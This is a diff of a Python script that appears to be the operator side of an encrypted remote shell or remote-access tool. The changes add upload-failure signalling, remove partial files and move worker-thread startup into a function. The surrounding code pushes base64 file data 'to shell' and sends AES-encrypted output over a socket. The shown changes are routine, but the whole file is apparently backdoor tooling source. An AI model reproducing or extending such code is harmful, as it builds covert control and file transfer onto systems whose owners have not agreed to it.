@@ -63,17 +63,23 @@ class UserInputWorker(MessageWorker):
 				self.send("EOF")
 			return "Download complete"
 		except Exception as e:
+			self.send("EOF_BAD")
 			return str(e)
 				
 	def file_handler_to_shell(self, filename):
 		try:
+			try: os.remove(filename)
+			except: pass
 			with open(filename, "wb") as w:
 				while True:
 					data = self.input_queue.get()
 					if data == "EOF": break
+					elif data == "EOF_BAD": raise Exception("Upload failed")
 					w.write(base64.b64decode(data))
 			return "Upload complete"
 		except Exception as e:
+			try: os.remove(filename)
+			except: pass
 			return str(e)
 			
 	def run(self):
@@ -94,17 +100,25 @@ class TransmitWorker(MessageWorker): # Pseudo-worker to send data to shell
 		while True:
 			comm_socket.sendall(EncodeAES(output_queue.get()))
 		
-workers = []
-transmit_worker = TransmitWorker(chr(0)) # Create workers
-user_input_worker = UserInputWorker(chr(1))
-workers.append(user_input_worker)
-workers.append(transmit_worker)
+		
+def create_workers():
+	workers = []
+	workers_threads = []
+	transmit_worker = TransmitWorker(chr(0)) # Create workers
+	user_input_worker = UserInputWorker(chr(1))
+	workers.append(user_input_worker)
+	workers.append(transmit_worker)
 
-for worker in workers: # Start workers
-	t = threading.Thread(target=worker.run)
-	t.daemon = True
-	t.start()
-
+	for worker in workers: # Start workers
+		t = threading.Thread(target=worker.run)
+		t.daemon = True
+		t.start()
+		workers_threads.append((worker, t))
+		
+	return workers, workers_threads
+	
+workers, workers_threads = create_workers()
+	
 while True:
 	data = ""
 	while not data.endswith(marker):
